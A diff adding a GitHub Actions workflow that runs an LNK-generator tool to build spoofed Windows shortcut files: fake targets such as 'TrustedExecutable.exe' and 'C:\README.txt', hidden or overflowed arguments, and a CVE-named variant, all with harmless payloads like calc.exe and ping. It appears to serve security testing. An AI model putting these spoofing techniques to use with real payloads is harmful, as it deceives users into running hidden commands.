@@ -1,0 +1,74 @@
+name: Generate LNK Files
+
+on:
+  push:
+    branches:
+      - main
+    paths:
+      - 'lnk-generator/**'
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  generate-lnk:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+
+      - name: Install lnk-generator
+        working-directory: ./lnk-generator
+        run: |
+          python3 -m pip install -e .
+
+      - name: Create output directory
+        run: mkdir -p lnk-output
+
+      - name: Generate SPOOFEXE_SHOWARGS_ENABLETARGET
+        run: |
+          python3 -m lnk-generator.generate `
+            --fake-path "TrustedExecutable.exe" `
+            --target-executable "c:\windows\system32\calc.exe" `
+            --output-file "lnk-output/SPOOFEXE_SHOWARGS_ENABLETARGET.lnk" `
+            SPOOFEXE_SHOWARGS_ENABLETARGET
+
+      - name: Generate REALEXE_HIDEARGS_DISABLETARGET
+        run: |
+          python3 -m lnk-generator.generate `
+            --target-executable "c:\windows\system32\conhost.exe" `
+            --target-command-line "cmd.exe /c ping 127.0.0.1" `
+            --output-file "lnk-output/REALEXE_HIDEARGS_DISABLETARGET.lnk" `
+            REALEXE_HIDEARGS_DISABLETARGET
+
+      - name: Generate CVE20259491
+        run: |
+          python3 -m lnk-generator.generate `
+            --target-executable "%COMSPEC%" `
+            --target-command-line "/c calc.exe" `
+            --output-file "lnk-output/CVE20259491.lnk" `
+            CVE20259491
+
+      - name: Generate SPOOFEXE_OVERFLOWARGS_DISABLETARGET
+        run: |
+          python3 -m lnk-generator.generate `
+            --fake-path "C:\README.txt" `
+            --target-executable "c:\windows\system32\cmd.exe" `
+            --target-command-line "/c ping 127.0.0.1" `
+            --icon "%WINDIR%\System32\imageres.dll" `
+            --icon-index=97 `
+            --output-file "lnk-output/SPOOFEXE_OVERFLOWARGS_DISABLETARGET.lnk" `
+            SPOOFEXE_OVERFLOWARGS_DISABLETARGET
+
+      - name: Upload generated LNK files
+        uses: actions/upload-artifact@v3
+        with:
+          name: generated-lnk-files
+          path: lnk-output/
+          retention-days: 30
